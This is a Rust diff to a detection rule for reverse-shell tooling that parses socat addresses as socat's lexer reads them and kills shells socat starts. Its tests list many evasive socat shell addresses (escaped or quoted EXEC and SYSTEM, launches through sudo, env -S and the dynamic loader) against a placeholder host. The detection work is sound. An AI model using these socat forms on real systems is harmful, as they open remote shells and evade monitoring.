@@ -64,51 +64,193 @@ const DISTRIBUTION_BIN_DIRS: &[&str] = &["/usr/bin/", "/bin/", "/usr/sbin/", "/s
 
 pub struct R006ReverseShellTooling<H: PostureHost> {
     allowlist: Arc<CommAllowlist<H>>,
+    /// Lot 313 (the review of #549, F2): the lineage, to judge the shell
+    /// socat starts (`None`: unit tests of the address reader only).
+    lineage: Option<crate::posture::lineage::AuthSessionTracker<H>>,
 }
 
 impl<H: PostureHost> R006ReverseShellTooling<H> {
     pub fn new(allowlist: Arc<CommAllowlist<H>>) -> Self {
-        Self { allowlist }
+        Self {
+            allowlist,
+            lineage: None,
+        }
+    }
+
+    /// Lot 313: this rule judging the shells socat starts too.
+    pub fn with_lineage(
+        mut self,
+        lineage: Option<crate::posture::lineage::AuthSessionTracker<H>>,
+    ) -> Self {
+        self.lineage = lineage;
+        self
+    }
+
+    /// Lot 313 (the review of #549, F2): `event` executes a shell or an
+    /// interpreter (by identity: [`program_identity::shell_or_interpreter`])
+    /// whose parent is socat, or which socat started through launchers
+    /// (`sudo -i`, `su -`, `script`, at most three hops): the shell an
+    /// address ran, whatever its spelling. socat's pid and executable.
+    fn started_by_socat(&self, event: &Event) -> Option<(u32, String)> {
+        let lineage = self.lineage.as_ref()?;
+        program_identity::shell_or_interpreter(event)?;
+        let Event::ProcessSpawn { pid, ppid, .. } = event else {
+            return None;
+        };
+        let as_of = crate::posture::lineage::AsOf::of_event(event);
+        let socat =
+            |exe: &str| program_identity::program_is(program_identity::base_of(exe), "socat");
+        let parent = lineage.exec_identity(*ppid, as_of)?;
+        let parent_exe = parent.exe.to_string_lossy().into_owned();
+        if socat(&parent_exe) {
+            return Some((*ppid, parent_exe));
+        }
+        if !program_identity::names_a_launcher(&parent_exe) {
+            return None;
+        }
+        let hops = lineage.lineage_identities(*pid, as_of)?;
+        for (p, id) in hops.iter().skip(2).take(2) {
+            let exe = id.exe.to_string_lossy().into_owned();
+            if socat(&exe) {
+                return Some((*p, exe));
+            }
+            if !program_identity::names_a_launcher(&exe) {
+                return None;
+            }
+        }
+        None
     }
 }
 
+/// Lot 313 (the review of #549, F2): an argument as socat's lexer reads it —
+/// a `\` keeps the next character, `'…'` and `"…"` are dropped around
+/// their content (`EX"EC":/bin/s\h` is `EXEC:/bin/sh`) — each character
+/// with whether it was quoted or escaped (no separator then).
+fn socat_lexed(arg: &str) -> Vec<(char, bool)> {
+    let mut out = Vec::with_capacity(arg.len());
+    let mut chars = arg.chars();
+    let mut quote: Option<char> = None;
+    while let Some(c) = chars.next() {
+        match (quote, c) {
+            (None | Some('"'), '\\') => {
+                if let Some(n) = chars.next() {
+                    out.push((n, true));
+                }
+            }
+            (None, '\'' | '"') => quote = Some(c),
+            (Some(q), c) if c == q => quote = None,
+            (Some(_), c) => out.push((c, true)),
+            (None, c) => out.push((c, false)),
+        }
+    }
+    out
+}
+
+/// `lexed` cut at each unquoted occurrence of `sep`.
+fn split_lexed<'a>(lexed: &'a [(char, bool)], sep: &[char]) -> Vec<&'a [(char, bool)]> {
+    let mut parts = Vec::new();
+    let mut from = 0;
+    let mut i = 0;
+    while i < lexed.len() {
+        let here = lexed[i..].iter().map(|(c, _)| *c);
+        if lexed[i..].len() >= sep.len()
+            && here.take(sep.len()).eq(sep.iter().copied())
+            && lexed[i..i + sep.len()].iter().all(|(_, q)| !q)
+        {
+            parts.push(&lexed[from..i]);
+            i += sep.len();
+            from = i;
+        } else {
+            i += 1;
+        }
+    }
+    parts.push(&lexed[from..]);
+    parts
+}
+
+fn text(lexed: &[(char, bool)]) -> String {
+    lexed.iter().map(|(c, _)| *c).collect()
+}
+
 /// Lot 313 (BUG-112): socat's addresses in `argv` — every argument after
-/// the program's name, a dual address (`a!!b`) split in two and a chain
-/// (`a|b`) in its links.
-fn addresses(argv: &[String]) -> impl Iterator<Item = &str> {
+/// the program's name, read by socat's lexer ([`socat_lexed`]), a dual
+/// address (`a!!b`) split in two and a chain (`a|b`) in its links, where
+/// the separator is not quoted.
+fn addresses(argv: &[String]) -> Vec<Vec<(char, bool)>> {
     argv.iter()
         .skip(1)
-        .flat_map(|a| a.split("!!"))
-        .flat_map(|a| a.split('|'))
+        .flat_map(|a| {
+            let lexed = socat_lexed(a);
+            split_lexed(&lexed, &['!', '!'])
+                .into_iter()
+                .flat_map(|d| split_lexed(d, &['|']))
+                .map(<[(char, bool)]>::to_vec)
+                .collect::<Vec<_>>()
+        })
+        .collect()
 }
 
 /// One socat address runs a shell (module docs): `SYSTEM:` and `SHELL:`
 /// always; `EXEC:` when its command line does
 /// ([`program_identity::command_runs_a_shell`]). The address type in any
 /// case; the command line up to socat's first `,` (its options).
-fn address_runs_a_shell(address: &str) -> bool {
-    let address = address.trim_start();
-    let Some((kind, rest)) = address.split_once(':') else {
-        return false;
+fn address_runs_a_shell(address: &[(char, bool)]) -> bool {
+    let start = address
+        .iter()
+        .position(|(c, q)| *q || !c.is_whitespace())
+        .unwrap_or(address.len());
+    let address = &address[start..];
+    let mut parts = split_lexed(address, &[':']).into_iter();
+    let kind = text(parts.next().unwrap_or(&[]));
+    let rest: Vec<(char, bool)> = {
+        let colon = address
+            .iter()
+            .position(|(c, q)| *c == ':' && !q)
+            .map_or(address.len(), |i| i + 1);
+        address[colon..].to_vec()
     };
+    if colon_free(address) {
+        return false;
+    }
     match kind.to_ascii_lowercase().as_str() {
         "system" | "shell" => true,
         "exec" => {
-            let command = rest.split(',').next().unwrap_or("");
-            let words: Vec<String> = command
-                .split_whitespace()
-                .map(|w| w.trim_matches(['\'', '"']).to_string())
-                .filter(|w| !w.is_empty())
-                .collect();
+            // the command line, up to socat's first unquoted `,` (its
+            // options), in words cut at whitespace (socat splits the
+            // command it unquoted: `EXEC:'/bin/sh -i'` runs `/bin/sh -i`)
+            let command = split_lexed(&rest, &[',']).into_iter().next().unwrap_or(&[]);
+            let mut words: Vec<String> = Vec::new();
+            let mut word = String::new();
+            for (c, _) in command {
+                if c.is_whitespace() {
+                    if !word.is_empty() {
+                        words.push(std::mem::take(&mut word));
+                    }
+                } else {
+                    word.push(*c);
+                }
+            }
+            if !word.is_empty() {
+                words.push(word);
+            }
             program_identity::command_runs_a_shell(&words)
         }
         _ => false,
     }
 }
 
-/// A socat address in `argv` runs a shell ([`address_runs_a_shell`]).
-fn socat_runs_a_shell(argv: &[String]) -> bool {
-    addresses(argv).any(address_runs_a_shell)
+/// `address` holds no unquoted `:` (no address type).
+fn colon_free(address: &[(char, bool)]) -> bool {
+    !address.iter().any(|(c, q)| *c == ':' && !q)
+}
+
+/// The first socat address in `argv` that runs a shell
+/// ([`address_runs_a_shell`]), as socat reads it (for the record).
+fn socat_shell_address(argv: &[String]) -> Option<String> {
+    addresses(argv)
+        .into_iter()
+        .find(|a| address_runs_a_shell(a))
+        .map(|a| text(&a))
 }
 
 impl<H: PostureHost> Rule for R006ReverseShellTooling<H> {
@@ -140,7 +282,27 @@ impl<H: PostureHost> Rule for R006ReverseShellTooling<H> {
         else {
             return None;
         };
-        let tool = program_identity::tool_named(event, OFFSEC_COMMS)?;
+        let Some(tool) = program_identity::tool_named(event, OFFSEC_COMMS) else {
+            // lot 313 (the review of #549, F2): the shell socat started,
+            // by its identity — whatever its address's spelling
+            let (socat_pid, socat_exe) = self.started_by_socat(event)?;
+            let Event::ProcessSpawn { filename, exe, .. } = event else {
+                return None;
+            };
+            let image = exe.path_or(filename);
+            return Some(build_verdict(
+                self,
+                event,
+                ResponseAction::KillProcessTree,
+                Severity::Critical,
+                &format!(
+                    "{image} is a shell or an interpreter started by socat ({socat_exe}, pid \
+                     {socat_pid}) — what one of its addresses ran, whatever its spelling: the \
+                     reverse- or bind-shell shape (T1059.004 over T1095); kill the process \
+                     tree"
+                ),
+            ));
+        };
         let judgement = super::judge_spawn(&self.allowlist, event);
         if judgement == Judgement::Allowed {
             return None;
@@ -153,7 +315,10 @@ impl<H: PostureHost> Rule for R006ReverseShellTooling<H> {
                 && DISTRIBUTION_BIN_DIRS.iter().any(|d| k.starts_with(d))
         });
         let cut = super::argv_cut_note(event);
-        let verdict = if tool == "socat" && distribution && !socat_runs_a_shell(argv) {
+        let shell_address = (tool == "socat")
+            .then(|| socat_shell_address(argv))
+            .flatten();
+        let verdict = if tool == "socat" && distribution && shell_address.is_none() {
             match cut {
                 // External audit EBPF-021: no shell in the part kept is not
                 // "no shell".
@@ -188,7 +353,14 @@ impl<H: PostureHost> Rule for R006ReverseShellTooling<H> {
                 ResponseAction::KillProcessTree,
                 Severity::Critical,
                 &super::with_argv_cut_note(
-                    "Known offensive security tooling detected".to_string(),
+                    match &shell_address {
+                        // lot 313: the address as socat reads it
+                        Some(address) => format!(
+                            "Known offensive security tooling detected: socat's address \
+                             `{address}` runs a shell"
+                        ),
+                        None => "Known offensive security tooling detected".to_string(),
+                    },
                     event,
                 ),
             )
@@ -579,6 +751,219 @@ mod bug112 {
         assert_eq!(
             socat1(&["relay", "TCP:h:1", "TCP:127.0.0.1:80"]),
             Some((ResponseAction::Log, Severity::High))
+        );
+    }
+}
+
+/// Lot 313 (the review of #549, F2 and F6): socat's lexer, the shell its
+/// address starts, and the launchers that start one.
+#[cfg(test)]
+mod review549 {
+    use super::*;
+    use crate::decision::rules::testutil::{kernel_exe, spawn_exe, spawn_full};
+    use crate::posture::host::testing::TestHost as H;
+    use crate::posture::lineage::AuthSessionTracker;
+
+    fn argv(a: &[&str]) -> Vec<String> {
+        a.iter().map(|s| s.to_string()).collect()
+    }
+
+    fn judged(args: &[&str]) -> (ResponseAction, Severity) {
+        let e = kernel_exe(spawn_full("socat", "/usr/bin/socat", 1000, args, "bash"));
+        let v = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()))
+            .evaluate(&e)
+            .expect("fires");
+        (v.action, v.severity)
+    }
+
+    /// F2: socat drops a `\` and the quotes anywhere in an address, the
+    /// keyword included (socat 1.8.0.0, checked by the reviewer with
+    /// `/bin/echo`); the reader read the raw text — a relay.
+    #[test]
+    fn review549_an_escaped_or_quoted_address_runs_its_shell() {
+        for args in [
+            &["socat", "TCP:h:1", "EXEC:/bin/s\\h"][..],
+            &["socat", "TCP:h:1", "EXEC:/bin/'s'h"],
+            &["socat", "TCP:h:1", "EXEC:/bin/s\"h\""],
+            &["socat", "TCP:h:1", "EX\"EC\":/bin/sh"],
+            &["socat", "TCP:h:1", "E\\XEC:/bin/sh"],
+            &["socat", "TCP:h:1", "SY\\STEM:id"],
+            // a quoted command line, its options after it
+            &["socat", "TCP:h:1", "EXEC:'/bin/sh -i',pty"],
+        ] {
+            assert_eq!(
+                judged(args),
+                (ResponseAction::KillProcessTree, Severity::Critical),
+                "{args:?}"
+            );
+        }
+        // the record names the address as socat reads it
+        let e = kernel_exe(spawn_full(
+            "socat",
+            "/usr/bin/socat",
+            1000,
+            &["socat", "TCP:h:1", "EX\"EC\":/bin/s\\h,pty"],
+            "bash",
+        ));
+        let v = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()))
+            .evaluate(&e)
+            .unwrap();
+        assert!(
+            v.reasoning.contains("`EXEC:/bin/sh,pty`"),
+            "{}",
+            v.reasoning
+        );
+        // guards: a quoted `!!` or `|` is no separator, a quoted `:` no
+        // address type; a relay stays one
+        for args in [
+            &["socat", "TCP:h:1", "OPEN:'/tmp/a!!EXEC:x'"][..],
+            &["socat", "TCP:h:1", "OPEN:'/tmp/a!!SYSTEM:x'"],
+            &["socat", "TCP:h:1", "OPEN:\"/tmp/a|SYSTEM:x\""],
+            &["socat", "TCP:h:1", "OPEN:/tmp/a\\!\\!SYSTEM:x"],
+        ] {
+            assert_eq!(
+                judged(args),
+                (ResponseAction::Log, Severity::High),
+                "{args:?}"
+            );
+        }
+    }
+
+    /// F6 and F4 on the address: the launchers that start a shell given no
+    /// program, `env -S`, busybox's own shells, the dynamic loader.
+    #[test]
+    fn review549_launchers_that_start_a_shell_are_read() {
+        for args in [
+            &["socat", "TCP:h:1", "EXEC:busybox hush -i"][..],
+            &["socat", "TCP:h:1", "EXEC:env -S/bin/sh"],
+            &["socat", "TCP:h:1", "EXEC:env -S '/bin/sh -i'"],
+            &["socat", "TCP:h:1", "EXEC:/usr/bin/env --split-string=sh"],
+            &["socat", "TCP:h:1", "EXEC:sudo -i"],
+            &["socat", "TCP:h:1", "EXEC:sudo -u root -s"],
+            &["socat", "TCP:h:1", "EXEC:su -"],
+            &["socat", "TCP:h:1", "EXEC:runuser -u x"],
+            &["socat", "TCP:h:1", "EXEC:chroot /"],
+            &["socat", "TCP:h:1", "EXEC:nsenter -t 1 -m"],
+            &[
+                "socat",
+                "TCP:h:1",
+                "EXEC:/lib64/ld-linux-x86-64.so.2 /bin/sh",
+            ],
+            &[
+                "socat",
+                "TCP:h:1",
+                "EXEC:/lib64/ld-linux-x86-64.so.2 --library-path /x --argv0 y /bin/bash -i",
+            ],
+        ] {
+            assert_eq!(
+                judged(args),
+                (ResponseAction::KillProcessTree, Severity::Critical),
+                "{args:?}"
+            );
+        }
+        for args in [
+            &["socat", "TCP:h:1", "EXEC:chroot / /usr/bin/id"][..],
+            &["socat", "TCP:h:1", "EXEC:busybox cat"],
+            &[
+                "socat",
+                "TCP:h:1",
+                "EXEC:/lib64/ld-linux-x86-64.so.2 /usr/bin/id",
+            ],
+            &["socat", "TCP:h:1", "EXEC:sudo -u root /usr/bin/id"],
+        ] {
+            assert_eq!(
+                judged(args),
+                (ResponseAction::Log, Severity::High),
+                "{args:?}"
+            );
+        }
+    }
+
+    fn child(pid: u32, ppid: u32, exe: &str, a: &[&str], ts: u64) -> Event {
+        let mut e = spawn_exe(a[0], exe, exe, 0);
+        if let Event::ProcessSpawn {
+            pid: p,
+            ppid: pp,
+            argv: v,
+            timestamp_ns,
+            start_ns,
+            uid,
+            ..
+        } = &mut e
+        {
+            (*p, *pp, *uid) = (pid, ppid, 1000);
+            *v = argv(a);
+            (*timestamp_ns, *start_ns) = (ts, ts - 1);
+        }
+        e
+    }
+
+    /// F2 (a): the shell socat starts, by its identity, is the address's
+    /// shell whatever its spelling — directly, or through a launcher that
+    /// forks (`sudo -i`); an interpreter too (`EXEC:python3 /tmp/x.py`).
+    /// Guards: a program socat starts that is no shell; a shell started by
+    /// anything else.
+    #[test]
+    fn review549_the_shell_socat_starts_is_killed() {
+        let dir = tempfile::tempdir().unwrap();
+        let t = AuthSessionTracker::<H>::new(dir.path());
+        let r = R006ReverseShellTooling::<H>::new(Arc::new(CommAllowlist::<H>::default()))
+            .with_lineage(Some(t.clone()));
+        let socat = child(
+            5490,
+            1,
+            "/usr/bin/socat1",
+            &["socat", "TCP:h:1", "EXEC:x"],
+            100,
+        );
+        t.ingest_spawn_event(&socat);
+        let kill = |e: &Event| {
+            t.ingest_spawn_event(e);
+            r.evaluate(e).map(|v| (v.action, v.severity, v.reasoning))
+        };
+        let sh = child(5491, 5490, "/usr/bin/dash", &["/bin/s\\h"], 200);
+        let (action, severity, why) = kill(&sh).expect("the address's shell");
+        assert_eq!(
+            (action, severity),
+            (ResponseAction::KillProcessTree, Severity::Critical)
+        );
+        assert!(why.contains("started by socat"), "{why}");
+        let py = child(
+            5492,
+            5490,
+            "/usr/bin/python3",
+            &["python3", "/tmp/x.py"],
+            300,
+        );
+        assert!(kill(&py).is_some(), "an interpreter socat started");
+        // through sudo -i: socat → sudo → bash
+        let sudo = child(5493, 5490, "/usr/bin/sudo", &["sudo", "-i"], 400);
+        t.ingest_spawn_event(&sudo);
+        let bash = child(5494, 5493, "/usr/bin/bash", &["-bash"], 500);
+        assert!(kill(&bash).is_some(), "the shell sudo started for socat");
+        // guards
+        let id = child(5495, 5490, "/usr/bin/id", &["id"], 600);
+        assert!(kill(&id).is_none(), "no shell");
+        let login = child(5496, 1, "/usr/bin/bash", &["-bash"], 700);
+        t.ingest_spawn_event(&login);
+        let sh2 = child(5497, 5496, "/usr/bin/dash", &["sh"], 800);
+        assert!(kill(&sh2).is_none(), "a shell's shell");
+        let sudo2 = child(5498, 5496, "/usr/bin/sudo", &["sudo", "-i"], 900);
+        t.ingest_spawn_event(&sudo2);
+        let bash2 = child(5499, 5498, "/usr/bin/bash", &["-bash"], 1000);
+        assert!(kill(&bash2).is_none(), "sudo -i from a login shell");
+        // the walk stops at the first hop that is no launcher: a shell a
+        // program socat ran starts (make → sh), or one sudo started under it
+        let make = child(5500, 5490, "/usr/bin/make", &["make"], 1100);
+        t.ingest_spawn_event(&make);
+        let sh3 = child(5501, 5500, "/usr/bin/dash", &["sh", "-c", "cc x.c"], 1200);
+        assert!(kill(&sh3).is_none(), "make's shell under socat's program");
+        let sudo3 = child(5502, 5500, "/usr/bin/sudo", &["sudo", "-i"], 1300);
+        t.ingest_spawn_event(&sudo3);
+        let bash3 = child(5503, 5502, "/usr/bin/bash", &["-bash"], 1400);
+        assert!(
+            kill(&bash3).is_none(),
+            "sudo's shell under make under socat"
         );
     }
 }
